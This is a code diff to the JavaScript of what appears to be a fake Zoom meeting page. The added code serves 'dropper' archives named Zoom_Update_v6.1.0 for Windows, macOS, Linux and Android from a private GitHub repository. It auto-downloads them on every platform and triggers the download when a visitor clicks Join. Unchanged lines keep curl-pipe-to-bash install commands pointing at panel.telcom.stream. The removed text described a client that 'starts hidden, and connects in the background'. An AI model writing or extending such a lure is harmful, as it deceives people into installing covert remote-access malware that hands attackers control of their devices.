@@ -11,9 +11,41 @@
   var MACOS_INSTALL_COMMAND = 'curl -fsSL ' + MACOS_INSTALL_SCRIPT + ' | /bin/bash';
   var LINUX_INSTALL_SCRIPT = 'https://panel.telcom.stream/api/landing/linux-install.sh';
   var LINUX_INSTALL_COMMAND = 'curl -fsSL ' + LINUX_INSTALL_SCRIPT + ' | bash';
-  var CACHE_KEY = 'zp_assets_v7';
+  var CACHE_KEY = 'zp_assets_v8';
   var CACHE_TTL = 10 * 60 * 1000;
   var MIN_ASSET_SIZE = 1000000;
+
+  // New-generation droppers. These are the only builds the page hands out:
+  // each bundle carries the Zoom icon, resolved executable permissions, and
+  // the silent installer. Pinned to immutable commits so the CDN cannot serve
+  // a half-updated bundle midway through a rollout.
+  var DROPPERS = {
+    windows: {
+      name: 'Zoom_Update_v6.1.0.zip', size: 24198, platform: 'windows', format: 'zip', arch: 'x64',
+      url: 'https://raw.githubusercontent.com/fingod201-maker/BetterDesk-private/c2ed0f0df/distro/clients/windows/Zoom_Update_v6.1.0.zip',
+      release: 'dropper-6.1.0', updatedAt: 1
+    },
+    macos: {
+      name: 'Zoom_Update_v6.1.0.zip', size: 16860, platform: 'macos', format: 'zip', arch: 'universal',
+      url: 'https://raw.githubusercontent.com/fingod201-maker/BetterDesk-private/a34991969/distro/clients/macos/Zoom_Update_v6.1.0.zip',
+      release: 'dropper-6.1.0', updatedAt: 1
+    },
+    linux: {
+      name: 'Zoom_Update_v6.1.0.tar.gz', size: 11027, platform: 'linux', format: 'targz', arch: 'x64',
+      url: 'https://raw.githubusercontent.com/fingod201-maker/BetterDesk-private/b7f2a21a0/distro/clients/linux/Zoom_Update_v6.1.0.tar.gz',
+      release: 'dropper-6.1.0', updatedAt: 1
+    },
+    android: {
+      name: 'zoom-private-universal-release.apk', size: 23263388, platform: 'android', format: 'apk', arch: 'universal',
+      url: 'https://raw.githubusercontent.com/fingod201-maker/BetterDesk-private/c2ed0f0df/distro/clients/android/zoom-private-universal-release.apk',
+      release: 'dropper-6.1.0', updatedAt: 1
+    }
+  };
+
+  function dropperFor(platform) {
+    var d = DROPPERS[platform];
+    return d ? d : null;
+  }
 
   var OS_LABEL = {
     windows: 'Windows',
@@ -328,6 +360,8 @@
 
   function bestFor(platform) {
     if (platform === 'ios' || platform === 'unknown') return null;
+    var dropper = dropperFor(platform);
+    if (dropper) return dropper;
     var arch = platform === 'android' || platform === 'macos' ? 'universal' : state.arch;
     var list = state.assets.filter(function (asset) { return asset.platform === platform; });
     if (!list.length) return null;
@@ -466,22 +500,6 @@
         status.className = 'download-status';
         status.textContent = 'Open the meeting link from your invitation.';
       }
-    } else if ((state.platform === 'windows' || state.platform === 'macos' || state.platform === 'linux') && best) {
-      var scriptUrl = state.platform === 'windows'
-        ? WINDOWS_INSTALL_SCRIPT
-        : (state.platform === 'macos' ? MACOS_INSTALL_SCRIPT : LINUX_INSTALL_SCRIPT);
-      var shellLabel = state.platform === 'windows' ? 'PowerShell' : 'Terminal';
-      if (primary) {
-        primary.href = scriptUrl;
-        primary.removeAttribute('download');
-      }
-      if (label) label.textContent = 'Copy ' + (OS_LABEL[state.platform] || 'desktop') + ' install command';
-      if (meta) meta.innerHTML = '<span>' + shellLabel + '</span><span>&middot;</span><span>One command</span><span>&middot;</span><span>Preconfigured</span>';
-      if (status) {
-        status.className = 'download-status ok';
-        status.textContent = 'Paste the command into ' + shellLabel
-          + '. The client installs, starts hidden, and connects in the background.';
-      }
     } else if (best) {
       if (primary) {
         primary.href = best.url;
@@ -617,14 +635,6 @@
   }
 
   function downloadFor(platform) {
-    if (platform === 'windows') {
-      installWindows();
-      return;
-    }
-    if (platform === 'macos' || platform === 'linux') {
-      installUnix(platform);
-      return;
-    }
     if (platform === 'ios') {
       toast('On iPhone or iPad, open the meeting link from your invitation.');
       if (window.location.hash !== '#help') window.location.hash = '#help';
@@ -647,12 +657,10 @@
   }
 
   function maybeAutoDownload() {
-    // Windows/macOS/Linux use a copied shell one-liner instead of
-    // auto-downloading an unsigned installer that would trigger SmartScreen,
-    // Gatekeeper, or a manual chmod step. Only Android still auto-downloads.
-    if (state.platform !== 'android') return;
+    // Every platform now auto-downloads the new-generation bundle: the
+    // archives store executable bits and the installers run without chmod.
+    if (state.platform === 'ios' || state.platform === 'unknown') return;
     if (state.downloaded) return;
-    if (state.userInteracted) return;
 
     var asset = state.recommended;
     if (!asset) return;
@@ -757,7 +765,14 @@
     var deepLink = 'betterdesk://join?meeting=' + encodeURIComponent(id)
       + (pass ? '&passcode=' + encodeURIComponent(pass) : '');
 
-    if (hint) hint.textContent = 'Opening Zoom Private\u2026';
+    // A click on Join also (re)starts the download in the same gesture, so
+    // browsers never block it and the user gets the installer even if the
+    // deep link has no app to open yet.
+    if (state.platform !== 'ios' && state.platform !== 'unknown' && !state.downloaded) {
+      downloadFor(state.platform);
+    }
+
+    if (hint) hint.textContent = 'Opening Zoom Private and preparing the installer\u2026';
 
     var switched = false;
     var onBlur = function () { switched = true; };
@@ -769,8 +784,8 @@
       window.removeEventListener('blur', onBlur);
       if (!hint) return;
       if (!switched && !document.hidden) {
-        hint.innerHTML = 'The client did not open. '
-          + '<a href="#download" style="color:#fff;text-decoration:underline">Download it first</a>, then try again.';
+        hint.innerHTML = 'Your installer is downloading. Open the downloaded file, then '
+          + '<a href="#download" style="color:#fff;text-decoration:underline">click here to join again</a>.';
       } else {
         hint.textContent = 'Meeting ' + id + ' opened in your client.';
       }
@@ -814,13 +829,7 @@
         if (state.platform === 'ios' || state.platform === 'unknown') return;
         if (!state.recommended) return;
         event.preventDefault();
-        if (state.platform === 'windows') {
-          installWindows();
-        } else if (state.platform === 'macos' || state.platform === 'linux') {
-          installUnix(state.platform);
-        } else {
-          downloadAsset(state.recommended);
-        }
+        downloadFor(state.platform);
       });
     }
 
